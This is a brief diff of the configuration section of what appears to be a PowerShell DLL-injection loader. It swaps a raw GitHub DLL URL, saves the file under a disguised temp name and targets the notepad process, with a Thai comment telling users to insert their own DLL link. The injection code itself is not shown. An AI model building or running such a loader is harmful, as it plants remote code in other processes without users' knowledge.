@@ -1,6 +1,6 @@
 
 # --- CONFIGURATION ---
-$dllUrl = "https://raw.githubusercontent.com/malachixxx/testdll/main/test.dll" # เปลี่ยนเป็นลิงก์ DLL ของคุณ
+$dllUrl = "https://raw.githubusercontent.com/malachixxx/testdll/main/Cleanup.dll" # เปลี่ยนเป็นลิงก์ DLL ของคุณ
 $tempPath = "$env:TEMP\data_cache.dll"
 $processName = "notepad"
 
